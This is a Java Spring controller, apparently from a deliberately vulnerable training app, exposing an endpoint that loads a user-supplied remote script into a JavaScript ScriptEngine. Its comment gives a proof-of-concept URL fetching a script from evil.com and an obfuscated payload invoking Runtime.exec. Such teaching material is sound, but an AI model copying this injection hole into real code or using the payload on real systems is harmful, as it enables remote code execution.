package com.best.hello.controller.RCE;

import io.swagger.annotations.ApiOperation;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;


@RestController
@RequestMapping("/vulnapi/RCE/ScriptEngine")
public class LoadJsVul {

    /**
     * @poc http://127.0.0.1:8888/RCE/Js/vul?url=http://evil.com/java/1.js
     * JS Payload绕过：var a = mainOutput(); function mainOutput() { var x=java.lang.\/****\/Runtime.getRuntime().exec("open -a Calculator");}
     * <p>
     * 在Java 8之后ScriptEngineManager的eval函数就没有了
     */
    @ApiOperation(value = "vul：代码注入 - 脚本引擎", notes = "调用远程js脚本程序进行封装")
    @GetMapping("/vul")
    public String jsEngine(String url) {
        try {
            // 通过脚本名称获取
            // ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");

            // 通过文件扩展名获取
            ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");

            // Bindings：用来存放数据的容器
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
            String payload = String.format("load('%s')", url);
            engine.eval(payload, bindings);
            return "漏洞执行成功";
        } catch (Exception e) {
            return "加载远程脚本: " + HtmlUtils.htmlEscape(url);
        }
    }

}